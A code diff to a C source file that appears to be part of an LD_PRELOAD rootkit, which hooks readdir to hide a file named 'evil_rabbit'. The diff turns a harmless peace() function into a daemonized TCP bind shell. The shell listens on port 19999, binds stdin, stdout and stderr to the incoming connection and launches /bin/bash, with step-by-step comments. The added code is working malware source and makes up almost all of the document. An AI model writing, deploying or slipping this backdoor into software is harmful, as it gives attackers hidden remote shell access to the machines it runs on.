@@ -19,20 +19,66 @@
 #include <string.h>
 #include <stdio.h>
 #include <dirent.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/ip.h>
+#include <unistd.h>
 
 
-#define HIDE_FILE   "evil_rabbit"
-#define SIGNATURE "snow_valley"
+#define HIDE_FILE  "evil_rabbit"
+#define SIGNATURE  "snow_valley"
+#define PORT       19999
 
 
 static struct dirent* (*original_readdir)(DIR *dirp) = NULL;
 static int PEACE_FLAG = 0;
 
 
+
+// Create a TCP Bind shell
+// 1. Create a socket
+// 2. Bind the socket (Assigning a name to socket)
+// 3. Start listening
+// 4. Accept a connection
+// 5. Duplicate STDIN, STDOUT and STDERR file desciptors to the new accepted connection
+// 6. Launch a shell. 
+//
 void peace()
 {
-	printf("Attaining peace\n");
-	return;
+	pid_t pid = fork();
+
+	if (pid < 0) return;
+
+	if (pid == 0)
+	{
+		// Daemonize the TCP bind shell
+		daemon(0,1);
+
+		struct sockaddr_in socketConfig;
+		socketConfig.sin_family = AF_INET;
+		socketConfig.sin_port   = htons(PORT);
+		socketConfig.sin_addr.s_addr = INADDR_ANY;
+
+		int sockfd = socket(AF_INET, SOCK_STREAM, 0);		// <1>
+		if (sockfd == -1) return;
+
+		int status = bind(sockfd, (struct sockaddr *) &socketConfig, sizeof(socketConfig));		// <2>
+		if (status == -1) return;
+
+		status = listen(sockfd, 0);			// <3>
+		if (status == -1) return;
+
+		int conn_sockfd = accept(sockfd, NULL, NULL);		// <4>
+		if (conn_sockfd == -1) return;
+
+		dup2(conn_sockfd, 0);	// <5> : duplicating STDIN
+		dup2(conn_sockfd, 1);	// <5> : duplicating STDOUT
+		dup2(conn_sockfd, 2);	// <5> : duplicating STDERR
+
+		execve("/bin/bash", NULL, NULL);	// <6>
+	}
+
+	return;	
 }
 
 
